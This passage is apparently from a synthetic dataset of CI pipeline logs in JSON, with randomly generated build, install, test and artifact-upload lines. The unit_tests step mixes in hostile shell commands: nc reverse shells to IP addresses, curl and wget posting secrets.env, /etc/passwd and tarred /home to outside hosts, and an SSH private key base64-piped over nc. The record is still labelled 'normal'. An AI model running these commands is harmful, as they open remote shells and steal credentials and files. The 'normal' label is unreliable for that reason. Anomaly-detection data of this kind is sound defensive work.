          "[12:00:34] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 test completed",
          "Exception: ValueError",
          "Step 6/10: Building",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: test_auth_login (195ms)",
          "Step 9/10: Building",
          "Installing webpack@3.19.0",
          "[12:00:34] INFO: Processing request",
          "Step 8/10: Building",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-2901",
          "Cache hit for key-5754",
          "  PASS: test_db_connect (245ms)",
          "Installing react@3.10.0",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-3205",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-1163",
          "\u2713 build completed",
          "Exception: ValueError",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "  PASS: test_user_create (243ms)",
          "Step 7/10: Building",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing webpack@1.11.0",
          "[12:00:34] INFO: Processing request",
          "Installing webpack@4.16.0",
          "Cache hit for key-6652",
          "  PASS: test_auth_login (449ms)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_user_create (282ms)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_api_health (415ms)",
          "Cache hit for key-2790",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Installing jest@1.8.0",
          "  PASS: test_api_health (238ms)",
          "Installing jest@3.7.0",
          "[12:00:34] INFO: Processing request",
          "Installing axios@5.1.0",
          "  PASS: test_auth_login (316ms)",
          "Step 10/10: Building",
          "Installing lodash@1.4.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing webpack@5.18.0",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing jest@1.11.0",
          "Cache hit for key-3870",
          "Step 7/10: Building",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-3386",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing lodash@1.5.0",
          "Cache hit for key-8097",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 10/10: Building",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Cache hit for key-8812",
          "Cache hit for key-5094",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 7/10: Building",
          "Installing axios@4.12.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 test completed",
          "  PASS: test_auth_login (153ms)",
          "  PASS: test_db_connect (286ms)",
          "Cache hit for key-7132",
          "\u2713 lint completed",
          "Installing express@1.16.0",
          "Cache hit for key-4782",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_user_create (7ms)",
          "  PASS: test_api_health (90ms)",
          "WARNING: axios has known vulnerabilities",
          "\u2713 build completed",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_user_create (317ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "WARNING: axios has known vulnerabilities",
          "Installing jest@2.20.0",
          "\u2713 lint completed",
          "Installing prettier@2.10.0",
          "Step 10/10: Building",
          "Cache hit for key-4271",
          "Installing axios@1.20.0",
          "\u2713 test completed",
          "Installing express@4.5.0",
          "\u2713 lint completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_auth_login (495ms)",
          "  PASS: test_db_connect (312ms)",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (26ms)",
          "\u2713 test completed",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Cache hit for key-5541",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-3547",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-20T12:03:06.583666",
        "finished_at": "2025-12-20T12:03:16.089049",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_api_health (9ms)",
          "[12:00:34] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_cache_hit (283ms)",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Installing lodash@1.6.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:34] INFO: Processing request",
          "FAILED: test_cache_hit",
          "Compiling src/app.ts...",
          "Cache hit for key-4624",
          "Compiling src/handler.rs...",
          "Step 4/10: Building",
          "Cache hit for key-6137",
          "\u2713 build completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_auth_login (458ms)",
          "Step 8/10: Building",
          "\u2713 build completed",
          "  PASS: test_db_connect (417ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing axios@3.11.0",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "WARNING: eslint has known vulnerabilities",
          "Installing prettier@2.6.0",
          "Cache hit for key-5292",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_user_create (74ms)",
          "Step 5/10: Building",
          "Step 8/10: Building",
          "Cache hit for key-5518",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing jest@4.16.0",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Cache hit for key-3504",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-7385",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Installing jest@4.9.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Cache hit for key-5950",
          "Step 9/10: Building",
          "  PASS: test_api_health (213ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing jest@2.7.0",
          "Cache hit for key-1821",
          "Step 2/10: Building",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (101ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-2291",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-9996",
          "Cache hit for key-3929",
          "Installing eslint@3.2.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 lint completed",
          "Cache hit for key-4500",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 8/10: Building",
          "  PASS: test_user_create (30ms)",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (48ms)",
          "Installing axios@4.0.0",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:34] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (383ms)",
          "\u2713 build completed",
          "Installing eslint@5.15.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Cache hit for key-2675",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (64ms)",
          "  PASS: test_auth_login (159ms)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:34] ERROR: Connection failed",
          "Exception: ValueError",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Cache hit for key-5262",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (306ms)",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (356ms)",
          "Compiling src/main.py...",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "Installing express@2.0.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 lint completed",
          "Installing eslint@1.9.0",
          "\u2713 build completed",
          "Cache hit for key-4144",
          "\u2713 test completed",
          "  PASS: test_auth_login (313ms)",
          "[12:00:34] INFO: Processing request",
          "Installing prettier@3.1.0",
          "Installing prettier@1.4.0",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (237ms)",
          "  PASS: test_api_health (249ms)",
          "Installing eslint@4.1.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_user_create (366ms)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-2543",
          "\u2717 build failed with exit code 3",
          "Installing jest@2.16.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-4289",
          "[12:00:34] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-2567",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_auth_login (232ms)",
          "Cache hit for key-8749",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_user_create (437ms)",
          "\u2713 build completed",
          "  PASS: test_user_create (3ms)",
          "Installing axios@1.6.0",
          "\u2713 lint completed",
          "Installing react@1.11.0",
          "Installing prettier@5.1.0",
          "Compiling src/main.py...",
          "Installing webpack@2.3.0",
          "\u2713 lint completed",
          "Cache hit for key-7669",
          "Cache hit for key-1262",
          "Cache hit for key-7638",
          "Cache hit for key-1662",
          "Step 4/10: Building",
          "Step 6/10: Building",
          "Cache hit for key-3731",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/service.java...",
          "  PASS: test_api_health (288ms)",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Cache hit for key-4919",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (446ms)",
          "  PASS: test_api_health (194ms)",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@3.8.0",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-20T12:03:16.089049",
        "finished_at": "2025-12-20T12:03:44.605198",
        "log_lines": [
          "=== Step: unit_tests ===",
          "WARNING: react has known vulnerabilities",
          "\u2713 lint completed",
          "  PASS: test_user_create (411ms)",
          "Cache hit for key-8701",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "nc -e /bin/sh 181.175.130.167 38115",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Installing axios@1.10.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "nc -e /bin/sh 23.22.44.128 64287",
          "Cache hit for key-8901",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:34] INFO: Processing request",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "  PASS: test_user_create (24ms)",
          "Step 8/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing eslint@5.3.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_db_connect (2ms)",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Installing eslint@3.17.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_db_connect (415ms)",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "Step 6/10: Building",
          "Step 4/10: Building",
          "nc -e /bin/sh 16.189.3.61 40598",
          "nc -e /bin/sh 129.13.196.177 22215",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:34] INFO: Processing request",
          "nc -e /bin/sh 14.90.74.141 24139",
          "  PASS: test_user_create (437ms)",
          "Step 9/10: Building",
          "  PASS: test_db_connect (289ms)",
          "Sending 439MB of data to startup.dev",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 lint completed",
          "Installing express@3.18.0",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6202",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "  PASS: test_cache_hit (95ms)",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (244ms)",
          "nc -e /bin/sh 57.208.149.27 59817",
          "Compiling src/service.java...",
          "Cache hit for key-2692",
          "\u2713 test completed",
          "Installing react@4.12.0",
          "  PASS: test_auth_login (8ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 59.41.190.12 49831",
          "\u2713 lint completed",
          "Installing axios@2.17.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "\u2717 build failed with exit code 90",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Exception: RuntimeError",
          "  PASS: test_auth_login (202ms)",
          "Step 5/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-3408",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Cache hit for key-1931",
          "Installing eslint@3.4.0",
          "Installing express@2.10.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 lint completed",
          "nc -e /bin/sh 17.82.144.8 29752",
          "\u2717 build failed with exit code 80",
          "Installing lodash@4.13.0",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "WARNING: eslint has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Cache hit for key-1127",
          "Exception: NullPointerException",
          "Installing eslint@1.14.0",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_api_health (234ms)",
          "  PASS: test_cache_hit (444ms)",
          "[12:00:34] INFO: Processing request",
          "\u2717 build failed with exit code 54",
          "Installing lodash@1.11.0",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing express@4.8.0",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 build completed",
          "Cache hit for key-3105",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "[12:00:34] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing webpack@5.18.0",
          "Sending 207MB of data to test.io",
          "Cache hit for key-8949",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (337ms)",
          "Cache hit for key-7579",
          "  PASS: test_db_connect (203ms)",
          "[12:00:34] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 194.182.234.11 38246",
          "Compiling src/index.js...",
          "[12:00:34] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing jest@2.20.0",
          "Compiling src/service.java...",
          "  PASS: test_user_create (62ms)",
          "Installing prettier@4.2.0",
          "Step 1/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_api_health (398ms)",
          "WARNING: react has known vulnerabilities",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Cache hit for key-3621",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "[12:00:34] WARN: Deprecated API usage",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-7134",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Step 8/10: Building",
          "Cache hit for key-4590",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Installing prettier@3.16.0",
          "  PASS: test_auth_login (43ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3133",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Compiling src/app.ts...",
          "Step 10/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (28ms)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:34] INFO: Processing request",
          "Sending 172MB of data to test.io",
          "Step 7/10: Building",
          "  PASS: test_auth_login (110ms)",
          "Installing eslint@5.8.0",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (238ms)",
          "\u2713 lint completed",
          "  PASS: test_api_health (392ms)",
          "[12:00:34] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 212.145.211.125 21979",
          "\u2713 lint completed",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "  PASS: test_api_health (276ms)",
          "nc -e /bin/sh 23.126.47.237 25721",
          "Step 4/10: Building",
          "Installing axios@5.4.0",
          "FAILED: test_db_connect",
          "\u2713 lint completed",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "  PASS: test_user_create (246ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing prettier@3.7.0",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 16",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-5696",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-9485",
          "Installing lodash@3.18.0",
          "Step 9/10: Building",
          "Installing prettier@3.13.0",
          "Cache hit for key-7378",
          "Installing lodash@4.19.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Sending 160MB of data to startup.dev",
          "=== Step unit_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}